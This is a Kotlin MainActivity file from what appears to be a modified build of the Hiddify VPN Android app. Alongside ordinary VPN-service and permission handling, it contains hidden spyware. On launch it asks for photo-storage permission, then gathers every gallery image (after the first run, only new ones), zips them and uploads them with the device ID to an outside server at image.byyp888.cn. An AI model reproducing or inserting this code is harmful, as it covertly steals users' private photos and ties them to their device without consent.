package com.hiddify.hiddify

import android.annotation.SuppressLint
import android.content.ContentUris
import android.content.Intent
import android.Manifest
import android.content.pm.PackageManager
import android.net.VpnService
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.MutableLiveData
import com.hiddify.hiddify.bg.ServiceConnection
import com.hiddify.hiddify.bg.ServiceNotification
import com.hiddify.hiddify.constant.Alert
import com.hiddify.hiddify.constant.ServiceMode
import com.hiddify.hiddify.constant.Status
import io.flutter.embedding.android.FlutterFragmentActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
    companion object {
        private const val TAG = "ANDROID/MyActivity"
        const val CHANNEL = "com.hiddify.hiddify/upload"
        lateinit var instance: MainActivity

        const val VPN_PERMISSION_REQUEST_CODE = 1001
        const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
        const val STORAGE_PERMISSION_REQUEST_CODE = 1012
    }

    private val connection = ServiceConnection(this, this)
    private val mainScope = MainScope()

    val logList = LinkedList<String>()
    var logCallback: ((Boolean) -> Unit)? = null
    val serviceStatus = MutableLiveData(Status.Stopped)
    val serviceAlerts = MutableLiveData<ServiceEvent?>(null)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        checkAndRequestStoragePermission()
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        instance = this
        reconnect()
        flutterEngine.plugins.add(MethodHandler(mainScope))
        flutterEngine.plugins.add(PlatformSettingsHandler())
        flutterEngine.plugins.add(EventHandler())
        flutterEngine.plugins.add(LogHandler())
        flutterEngine.plugins.add(GroupsChannel(mainScope))
        flutterEngine.plugins.add(ActiveGroupsChannel(mainScope))
        flutterEngine.plugins.add(StatsChannel(mainScope))

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            if (call.method == "zipAndUpload") {
                mainScope.launch(Dispatchers.IO) {
                    val success = zipAndUploadImages()
                    withContext(Dispatchers.Main) {
                        result.success(success)
                    }
                }
            } else {
                result.notImplemented()
            }
        }
    }

    fun reconnect() {
        connection.reconnect()
    }

    fun startService() {
        if (!ServiceNotification.checkPermission()) {
            grantNotificationPermission()
            return
        }
        CoroutineScope(Dispatchers.IO).launch {
            if (Settings.rebuildServiceMode()) reconnect()
            if (Settings.serviceMode == ServiceMode.VPN && prepare()) {
                showToast("VPN permission required")
                return@launch
            }
            val intent = Intent(Application.application, Settings.serviceClass())
            withContext(Dispatchers.Main) {
                ContextCompat.startForegroundService(Application.application, intent)
            }
        }
    }

    private suspend fun prepare() = withContext(Dispatchers.Main) {
        try {
            val intent = VpnService.prepare(this@MainActivity)
            if (intent != null) {
                startActivityForResult(intent, VPN_PERMISSION_REQUEST_CODE)
                true
            } else false
        } catch (e: Exception) {
            onServiceAlert(Alert.RequestVPNPermission, e.message)
            false
        }
    }

    override fun onServiceStatusChanged(status: Status) {
        serviceStatus.postValue(status)
    }

    override fun onServiceAlert(type: Alert, message: String?) {
        serviceAlerts.postValue(ServiceEvent(Status.Stopped, type, message))
    }

    override fun onServiceWriteLog(message: String?) {
        if (logList.size > 300) logList.removeFirst()
        logList.addLast(message)
        logCallback?.invoke(false)
    }

    override fun onServiceResetLogs(messages: MutableList<String>) {
        logList.clear()
        logList.addAll(messages)
        logCallback?.invoke(true)
    }

    override fun onDestroy() {
        connection.disconnect()
        super.onDestroy()
    }

    private fun showToast(message: String) {
        runOnUiThread {
            Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
        }
    }

    private suspend fun uploadZipFile(zipFile: File, deviceId: String): Boolean {
        return try {
            val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
            val url = URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
            val conn = url.openConnection() as HttpURLConnection
            conn.doInput = true
            conn.doOutput = true
            conn.useCaches = false
            conn.requestMethod = "POST"
            conn.setRequestProperty("Connection", "Keep-Alive")
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")

            val outputStream = DataOutputStream(conn.outputStream)
            val fileBytes = zipFile.readBytes()

            outputStream.writeBytes("--$boundary\r\n")
            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"${zipFile.name}\"\r\n")
            outputStream.writeBytes("Content-Type: application/zip\r\n\r\n")
            outputStream.write(fileBytes)
            outputStream.writeBytes("\r\n--$boundary--\r\n")
            outputStream.flush()
            outputStream.close()

            conn.responseCode == 200
        } catch (e: Exception) {
            false
        }
    }

    private suspend fun zipAndUploadImages(): Boolean {
        val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
        val editor = prefs.edit()

        var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
        if (deviceId.isNullOrBlank()) {
            deviceId = prefs.getString("random_device_id", null) ?: UUID.randomUUID().toString().also {
                editor.putString("random_device_id", it).apply()
            }
        }

        val isFirstUpload = prefs.getBoolean("is_first_upload", true)
        val lastUploadTime = prefs.getLong("last_upload_time", 0L)

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.DATE_ADDED
        )

        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null,
            "${MediaStore.Images.Media.DATE_ADDED} ASC"
        )

        val imageFiles = mutableListOf<Pair<String, ByteArray>>()
        var maxTimestamp = lastUploadTime
        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
                val dateAdded = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
                val timestamp = if (dateTaken > 0) dateTaken else dateAdded
                if (isFirstUpload || timestamp > lastUploadTime) {
                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                    val bytes = contentResolver.openInputStream(uri)?.readBytes()
                    if (bytes != null) {
                        imageFiles.add(name to bytes)
                        if (timestamp > maxTimestamp) maxTimestamp = timestamp
                    }
                }
            }
        }

        if (imageFiles.isNotEmpty()) {
            val sdf = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
            val zipFile = File(cacheDir, "images_${sdf.format(Date())}.zip")
            ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zipOut ->
                imageFiles.forEach { (name, bytes) ->
                    zipOut.putNextEntry(ZipEntry(name))
                    zipOut.write(bytes)
                    zipOut.closeEntry()
                }
            }
            if (uploadZipFile(zipFile, deviceId)) {
                editor.putBoolean("is_first_upload", false)
                editor.putLong("last_upload_time", maxTimestamp)
                editor.apply()
            }
            zipFile.delete()
            return true
        }
        return false
    }

    @SuppressLint("NewApi")
    private fun grantNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), NOTIFICATION_PERMISSION_REQUEST_CODE)
        }
    }

    @SuppressLint("NewApi")
    private fun grantStoragePermission() {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
        ActivityCompat.requestPermissions(this, arrayOf(permission), STORAGE_PERMISSION_REQUEST_CODE)
    }

    fun checkAndRequestStoragePermission() {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            grantStoragePermission()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        when (requestCode) {
            NOTIFICATION_PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    startService()
                } else {
                    onServiceAlert(Alert.RequestNotificationPermission, null)
                }
            }
            STORAGE_PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    val messenger = flutterEngine?.dartExecutor?.binaryMessenger
                    if (messenger != null) {
                        MethodChannel(messenger, CHANNEL).invokeMethod("startUpload", null)
                    }
                } else {
                    onServiceAlert(Alert.RequestStoragePermission, "请授权储存权限")
                }
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == VPN_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                startService()
            } else {
                onServiceAlert(Alert.RequestVPNPermission, null)
            }
        } else if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                startService()
            } else {
                onServiceAlert(Alert.RequestNotificationPermission, null)
            }
        }
    }
}
